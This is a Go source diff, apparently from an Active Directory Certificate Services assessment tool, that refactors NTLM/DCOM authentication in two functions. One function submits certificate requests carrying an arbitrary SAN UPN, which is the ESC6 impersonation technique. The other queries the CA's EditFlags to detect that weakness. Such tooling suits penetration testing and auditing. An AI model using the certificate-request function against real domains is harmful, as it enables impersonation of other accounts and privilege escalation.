@@ -30,42 +30,42 @@ import (
 )
 
 // adcsSubmitCSR connects to the CA via DCOM and submits the CSR.
-// Credentials are passed via dcerpc.WithCredentials() matching the go-msrpc config pattern.
+// Must run in subprocess isolation (--rpc-helper) due to go-msrpc NTLM global state.
+// Mirrors go-msrpc's wmic.go example exactly: context-level auth, single connection,
+// WithSign on both ObjectExporter and Activation.
 func adcsSubmitCSR(ctx context.Context, server, caName, template, altName string, csrDER []byte, cred sspcred.Credential) (*icertrequestd.RequestResponse, error) {
-	credOpt := dcerpc.WithCredentials(cred)
+	gssapi.AddCredential(cred)
+	gssapi.AddMechanism(ssp.NTLM)
+	ctx = gssapi.NewSecurityContext(ctx)
 
-	// Step 1: Connect to EPM well-known endpoint (port 135) on the CA server
-	cc, err := dcerpc.Dial(ctx, net.JoinHostPort(server, "135"))
+	epmAddr := net.JoinHostPort(server, "135")
+
+	cc, err := dcerpc.Dial(ctx, epmAddr)
 	if err != nil {
-		return nil, fmt.Errorf("dial EPM on %s:135: %w", server, err)
+		return nil, fmt.Errorf("dial EPM on %s: %w", epmAddr, err)
 	}
 	defer cc.Close(ctx)
 
-	// Step 2: ObjectExporter — ServerAlive2 to get COM version and bindings
-	cli, err := iobjectexporter.NewObjectExporterClient(ctx, cc, dcerpc.WithSign(), credOpt)
+	cli, err := iobjectexporter.NewObjectExporterClient(ctx, cc, dcerpc.WithSign(), dcerpc.WithTargetName(server))
 	if err != nil {
 		return nil, fmt.Errorf("object exporter client: %w", err)
 	}
-
 	srv, err := cli.ServerAlive2(ctx, &iobjectexporter.ServerAlive2Request{})
 	if err != nil {
 		return nil, fmt.Errorf("ServerAlive2: %w", err)
 	}
 
-	// Step 3: RemoteActivation — activate ICertRequestD via DCOM
-	iact, err := iactivation.NewActivationClient(ctx, cc, dcerpc.WithSign(), credOpt)
+	iact, err := iactivation.NewActivationClient(ctx, cc, dcerpc.WithSign(), dcerpc.WithTargetName(server))
 	if err != nil {
 		return nil, fmt.Errorf("activation client: %w", err)
 	}
 
-	// ClassID for the certificate request COM class (CertRequestD).
 	certServerClassID := dtyp.GUIDFromUUID(uuid.MustParse("d99e6e74-fc88-11d0-b498-00a0c90312f3"))
-
 	act, err := iact.RemoteActivation(ctx, &iactivation.RemoteActivationRequest{
 		ORPCThis:                   &dcom.ORPCThis{Version: srv.COMVersion},
 		ClassID:                    certServerClassID,
 		IIDs:                       []*dcom.IID{icertrequestd.CertRequestDIID},
-		RequestedProtocolSequences: []uint16{7, 15}, // ncacn_ip_tcp, ncacn_np
+		RequestedProtocolSequences: []uint16{7, 15},
 	})
 	if err != nil {
 		return nil, fmt.Errorf("RemoteActivation: %w", err)
@@ -74,32 +74,28 @@ func adcsSubmitCSR(ctx context.Context, server, caName, template, altName string
 		return nil, fmt.Errorf("RemoteActivation HRESULT: 0x%08x", uint32(act.HResult))
 	}
 
-	// Step 4: Dial the OXID endpoint for the activated object
-	conn, err := dcerpc.Dial(ctx, net.JoinHostPort(server, "135"),
-		act.OXIDBindings.EndpointsByProtocol("ncacn_ip_tcp")...)
+	conn, err := dcerpc.Dial(ctx, server,
+		append(act.OXIDBindings.EndpointsByProtocol("ncacn_ip_tcp"),
+			dcerpc.WithSign(),
+			dcerpc.WithTargetName(server))...)
 	if err != nil {
 		return nil, fmt.Errorf("dial OXID endpoint: %w", err)
 	}
 	defer conn.Close(ctx)
 
-	// Step 5: Create WCCE client — fresh security context, credentials + mechanisms via options
-	ctx = gssapi.NewSecurityContext(ctx)
-	mechSPNEGO := dcerpc.WithMechanism(ssp.SPNEGO)
-	mechNTLM := dcerpc.WithMechanism(ssp.NTLM)
-	wcceCli, err := wcce_client.NewClient(ctx, conn, dcerpc.WithSeal(), credOpt, mechSPNEGO, mechNTLM)
+	wcceCli, err := wcce_client.NewClient(ctx, conn,
+		dcerpc.WithSign(),
+		dcerpc.WithTargetName(server))
 	if err != nil {
 		return nil, fmt.Errorf("WCCE client: %w", err)
 	}
 	wcceCli = wcceCli.IPID(ctx, act.InterfaceData[0].IPID())
 
-	// Step 6: Build request attributes
 	attrs := fmt.Sprintf("CertificateTemplate:%s\n", template)
 	if altName != "" {
-		// Also set SAN via attributes for ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)
 		attrs += fmt.Sprintf("SAN:upn=%s\n", altName)
 	}
 
-	// Step 7: Submit the certificate request
 	resp, err := wcceCli.CertRequestD().Request(ctx, &icertrequestd.RequestRequest{
 		This:       &dcom.ORPCThis{Version: srv.COMVersion},
 		Flags:      crInPKCS10,
@@ -126,17 +122,19 @@ const editfAttributeSubjectAltName2 = 0x00040000
 // the EditFlags from the policy module configuration. This is used to detect
 // ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2).
 func adcsQueryEditFlags(ctx context.Context, server, caName string, cred sspcred.Credential) (uint32, error) {
-	credOpt := dcerpc.WithCredentials(cred)
+	gssapi.AddCredential(cred)
+	gssapi.AddMechanism(ssp.NTLM)
+	ctx = gssapi.NewSecurityContext(ctx)
 
-	// Connect to EPM on port 135
-	cc, err := dcerpc.Dial(ctx, net.JoinHostPort(server, "135"))
+	epmAddr := net.JoinHostPort(server, "135")
+
+	cc, err := dcerpc.Dial(ctx, epmAddr)
 	if err != nil {
-		return 0, fmt.Errorf("dial EPM on %s:135: %w", server, err)
+		return 0, fmt.Errorf("dial EPM on %s: %w", epmAddr, err)
 	}
 	defer cc.Close(ctx)
 
-	// ObjectExporter — ServerAlive2
-	cli, err := iobjectexporter.NewObjectExporterClient(ctx, cc, dcerpc.WithSign(), credOpt)
+	cli, err := iobjectexporter.NewObjectExporterClient(ctx, cc, dcerpc.WithSign(), dcerpc.WithTargetName(server))
 	if err != nil {
 		return 0, fmt.Errorf("object exporter client: %w", err)
 	}
@@ -145,8 +143,7 @@ func adcsQueryEditFlags(ctx context.Context, server, caName string, cred sspcred
 		return 0, fmt.Errorf("ServerAlive2: %w", err)
 	}
 
-	// RemoteActivation — activate CertAdminD class (d99e6e73) with ICertAdminD2 IID
-	iact, err := iactivation.NewActivationClient(ctx, cc, dcerpc.WithSign(), credOpt)
+	iact, err := iactivation.NewActivationClient(ctx, cc, dcerpc.WithSign(), dcerpc.WithTargetName(server))
 	if err != nil {
 		return 0, fmt.Errorf("activation client: %w", err)
 	}
@@ -165,23 +162,23 @@ func adcsQueryEditFlags(ctx context.Context, server, caName string, cred sspcred
 		return 0, fmt.Errorf("RemoteActivation HRESULT: 0x%08x", uint32(act.HResult))
 	}
 
-	// Dial OXID endpoint
-	conn, err := dcerpc.Dial(ctx, net.JoinHostPort(server, "135"),
-		act.OXIDBindings.EndpointsByProtocol("ncacn_ip_tcp")...)
+	conn, err := dcerpc.Dial(ctx, server,
+		append(act.OXIDBindings.EndpointsByProtocol("ncacn_ip_tcp"),
+			dcerpc.WithSign(),
+			dcerpc.WithTargetName(server))...)
 	if err != nil {
 		return 0, fmt.Errorf("dial OXID endpoint: %w", err)
 	}
 	defer conn.Close(ctx)
 
-	// Create CSRA client (CertAdminD + CertAdminD2) — mechanisms required for TCP bind
-	ctx = gssapi.NewSecurityContext(ctx)
-	csraCli, err := csra_client.NewClient(ctx, conn, dcerpc.WithSeal(), credOpt, dcerpc.WithMechanism(ssp.SPNEGO), dcerpc.WithMechanism(ssp.NTLM))
+	csraCli, err := csra_client.NewClient(ctx, conn,
+		dcerpc.WithSign(),
+		dcerpc.WithTargetName(server))
 	if err != nil {
 		return 0, fmt.Errorf("CSRA client: %w", err)
 	}
 	csraCli = csraCli.IPID(ctx, act.InterfaceData[0].IPID())
 
-	// Query EditFlags via GetConfigEntry
 	resp, err := csraCli.CertAdminD2().GetConfigEntry(ctx, &icertadmind2.GetConfigEntryRequest{
 		This:      &dcom.ORPCThis{Version: srv.COMVersion},
 		Authority: caName,
